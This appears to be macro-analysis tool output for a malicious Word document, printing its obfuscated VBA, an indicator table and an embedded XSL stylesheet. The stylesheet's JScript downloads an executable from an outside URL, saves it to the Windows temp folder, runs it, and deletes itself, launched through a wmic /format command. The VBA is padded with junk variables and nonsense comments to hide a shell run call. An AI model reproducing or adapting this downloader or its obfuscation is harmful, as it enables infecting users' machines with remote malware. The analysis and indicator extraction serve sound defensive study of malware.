+Dim aFMOoNyd
+aFMOoNyd = Exp(4)
+Dim amfDu
+amfDu = Fix(11)
+Dim aXTuPLS5
+aXTuPLS5 = Hex(72)
+' Immeasurable astringent
+Dim a3d7K
+a3d7K = Abs(56)
+Dim ae2jNxg
+ae2jNxg = Fix(9)
+Set a7JUTBgSC = New WshShell
+Dim aL9Ox
+aL9Ox = Exp(3)
+' Carnival clive newfoundland burner layers
+Dim acN7CB0E
+acN7CB0E = Abs(48)
+' Infuse apse tidal latticed
+Dim atY7uXym8
+atY7uXym8 = Fix(11)
+Dim aY9ZTq0J
+aY9ZTq0J = Fix(10)
+av8rwWP = ""
+aSQAt6Fl = IsNull(av8rwWP)
+Dim a3GhNR
+a3GhNR = Abs(-35)
+a7JUTBgSC.run aEFo3ORZ, 0
+Dim aInqePR
+aInqePR = Exp(4)
+' Determine tease lazarus roam
+Dim aSdmh
+aSdmh = Exp(3)
+' Jar sambo incentives nathan frames ditty unpopular
+
+Dim a4QyLn175
+a4QyLn175 = Hex(79)
+aHYrJg1b3 = ""
+aJoILFZ = IsNull(aHYrJg1b3)
+' Et
+Dim ark02
+ark02 = Hex(102)
+' Exhilaration idaho atrium japanese surfeit
+Dim aL7iCqWUh
+For aL7iCqWUh = 61 To 64
+Debug.Print Error(aL7iCqWUh)
+Next aL7iCqWUh
+' Avon gunshot postman shoemaker floyd
+Dim aUvdlAs
+aUvdlAs = Abs(56)
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO aElSGoL2t.frm 
+in file: info_08.15.doc - OLE stream: u'Macros/VBA/aElSGoL2t'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Private Sub UserForm_Initialize()
+Dim acTY95b23
+acTY95b23 = Fix(14)
+' Vans recondite compared finishing
+Dim aM1vciSg5
+aM1vciSg5 = Exp(14)
+aDdlzYL9 = ""
+aRN1J = IsNull(aDdlzYL9)
+' Imagination
+Dim axRQyWGfF
+axRQyWGfF = Hex(172)
+' Styles
+Dim a1XZ4WwMO
+a1XZ4WwMO = Abs(10)
+' Frederick provisional baptismal heterogeneous bind
+Dim a9A7Qux0H
+a9A7Qux0H = Abs(50)
+' Retaliation
+End Sub
+Public Sub test()
+Dim a0S94
+a0S94 = Fix(6)
+' Hughes nigeria disavow principal allow
+Dim a1ZKym
+a1ZKym = Hex(150)
+' Confirmation achieving res banana ryan floppy
+Dim aGOwqKIu
+aGOwqKIu = Hex(85)
+Dim aAdDk4rM
+aAdDk4rM = Hex(99)
+' Donald mediawiki
+End Sub
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+-------------------------------------------------------------------------------
+      VBA FORM STRING IN 'info_08.15.doc' - OLE stream: u'Macros/aElSGoL2t/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+<?xml version='1.0'?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://google.com/namespace">
+	<msxsl:script language="JScript" implements-prefix="user">
+	<![CDATA[
+
+		function aCNIy(adOVc)
+		{
+			var a6SZB = [
+							"http://mgregyoherminio.com/qtra/ttqr.php?l=geus6.j12",
+							"wscript.sh" + "ell",
+							"scripting.file" + "systemobject",
+							"msxml2.xmlhttp",
+							"sav" + "etofile",
+							"r" + "un",
+							"deletefile",
+							"c:\\win" + "dows\\temp\\aKMYfn.exe",
+						];
+
+			return(a6SZB[adOVc]);
+		}
+
+	]]>
+	</msxsl:script>
+	<msxsl:script language="JScript" implements-prefix="user">
+	<![CDATA[
+
+		// url
+		var agWEApk = aCNIy(0);
+
+		// wscript.shell
+		var aSBaMCj2 = new ActiveXObject(aCNIy(1));
+
+		// scripting.filesystemobject
+		var a5hcknwB = new ActiveXObject(aCNIy(2));
+
+	]]>
+	</msxsl:script>
+	<msxsl:script language="JScript" implements-prefix="user">
+	<![CDATA[
+
+		function aGhsTVX9(adOVc)
+		{
+			// msxml2.xmlhttp
+			var aHfawByp = new ActiveXObject(aCNIy(3));
+
+			aHfawByp.open("GET", agWEApk, 0);
+			aHfawByp.send();
+
+			if(aHfawByp.status === 200 && aHfawByp.readystate === 4)
+			{
+				var aLH15r = new ActiveXObject("adodb.stream");
+				aLH15r.open();
+				aLH15r.type = 1;
+				aLH15r.write(aHfawByp.responsebody);
+				aLH15r.position = 0;
+				aLH15r[aCNIy(4)](aCNIy(7), 2);
+				aLH15r.close();
+
+				aSBaMCj2[aCNIy(5)](aCNIy(7));
+
+				// Self delete
+				a5hcknwB[aCNIy(6)]("arJzRsLeT.xsl.xsl");
+			}
+		}
+
+	]]>
+	</msxsl:script>
+<xsl:template match="/">
+<xsl:value-of select="user:aGhsTVX9('')"/>
+</xsl:template>
+</xsl:stylesheet>
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'info_08.15.doc' - OLE stream: u'Macros/aElSGoL2t/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma
++------------+----------------------+-----------------------------------------+
+| Type       | Keyword              | Description                             |
++------------+----------------------+-----------------------------------------+
+| AutoExec   | Document_Open        | Runs when the Word document is opened   |
+| Suspicious | Open                 | May open a file                         |
+| Suspicious | Shell                | May run an executable file or a system  |
+|            |                      | command                                 |
+| Suspicious | WScript.Shell        | May run an executable file or a system  |
+|            |                      | command                                 |
+| Suspicious | Run                  | May run an executable file or a system  |
+|            |                      | command                                 |
+| Suspicious | Chr                  | May attempt to obfuscate specific       |
+|            |                      | strings                                 |
+| Suspicious | ADODB.Stream         | May create a text file                  |
+| Suspicious | Write                | May write to a file (if combined with   |
+|            |                      | Open)                                   |
+| Suspicious | Output               | May write to a file (if combined with   |
+|            |                      | Open)                                   |
+| Suspicious | Print #              | May write to a file (if combined with   |
+|            |                      | Open)                                   |
+| Suspicious | Msxml2.XMLHTTP       | May download files from the Internet    |
+| Suspicious | Windows              | May enumerate application windows (if   |
+|            |                      | combined with Shell.Application object) |
+|            |                      | (obfuscation: Hex)                      |
+| Suspicious | Hex Strings          | Hex-encoded strings were detected, may  |
+|            |                      | be used to obfuscate strings (option    |
+|            |                      | --decode to see all)                    |
+| Suspicious | Base64 Strings       | Base64-encoded strings were detected,   |
+|            |                      | may be used to obfuscate strings        |
+|            |                      | (option --decode to see all)            |
+| IOC        | http://www.w3.org/19 | URL                                     |
+|            | 99/XSL/Transform     |                                         |
+| IOC        | http://google.com/na | URL                                     |
+|            | mespace              |                                         |
+| IOC        | http://mgregyohermin | URL                                     |
+|            | io.com/qtra/ttqr.php |                                         |
+|            | ?l=geus6.j12         |                                         |
+| IOC        | aKMYfn.exe           | Executable file name                    |
+| Hex String | c:\Windows\System32\ | 633a5c57696e646f77735c53797374656d33325 |
+|            | wbem\wmic process    | c7762656d5c776d69632070726f63657373206c |
+|            | list /format:"arJzRs | 697374202f666f726d61743a2261724a7a52734 |
+|            | LeT.xsl"             | c65542e78736c22                         |
+| Hex String | e}Yr                 | 657D5972                                |
++------------+----------------------+-----------------------------------------+
+
+c:\Windows\System32\wbem\wmic process list /format:"arJzRsLeT.xsl"   
